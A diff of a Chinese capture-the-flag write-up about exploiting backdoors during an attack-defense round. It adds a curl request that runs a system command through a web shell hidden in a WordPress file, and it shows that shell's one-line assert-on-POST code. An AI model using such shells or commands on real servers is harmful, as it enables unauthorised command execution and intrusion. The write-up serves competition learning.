@@ -423,6 +423,10 @@ flag{qwe3_89fdsf3_jjnj3ioxc_ozxov}
 
 一上来D盾扫出几个后门。用其中一个连了菜刀，在`E:\wwwroot\RequestFlag\` 发现`url.bat` ，内容为：`curl.exe https://FlagServer.com:9000/flag --cacert ca.crt --cert client.crt --key client.key` ，在目标机上执行该命令可以得到对方flag。
 
+```bash
+curl "http://172.16.18.13/wordpress/wp-includes/customize/class-wp-customize-background-image-list.php" -d "-7=system('E:\wwwroot\RequestFlag\curl.exe https://FlagServer.com:9000/flag --cacert E:\wwwroot\RequestFlag\ca.crt --cert E:\wwwroot\RequestFlag\client.crt --key E:\wwwroot\RequestFlag\client.key');"
+```
+
 用的木马是`wwwroot\wordpress\wp-includes\customize\class-wp-customize-background-image-list.php`  ，相当于`@assert(${_POST}[-7]);` 。
 
 ```php
